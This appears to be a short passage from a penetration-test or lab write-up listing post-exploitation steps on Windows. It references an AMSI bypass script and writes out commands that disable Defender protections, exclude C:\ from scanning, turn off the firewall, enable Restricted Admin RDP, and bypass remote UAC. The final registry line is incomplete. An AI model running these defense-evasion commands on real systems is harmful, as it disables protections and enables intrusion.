

I used the following steps:  

-  AMSI Bypass: A PowerShell script (amsibypass.txt) from tools.zip, which disables AMSI hooks in memory, allowing execution of postexploitation tools.  

-  Execution Policy Bypass: 
		`Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser.` -> This allows execution of unsigned  

PowerShell scripts in the current user context.



With Administrator access, I executed the following commands to disable defensive mechanisms and facilitate easier tool execution:  
-  Disable Defender and related protections
		`Set-MpPreference -DisableRealtimeMonitoring $true ` 
		`Set-MpPreference -DisableIOAVProtection $true  Add-MpPreference -ExclusionPath 'C:\'  `
-  Disable firewall  
		`netsh advfirewall set allprofiles state off  `
-  Allow RDP with administrative creds  
		`New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0  `
-  Bypass remote UAC  
		`"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy" /t  REG_DWORD /d 1 /f`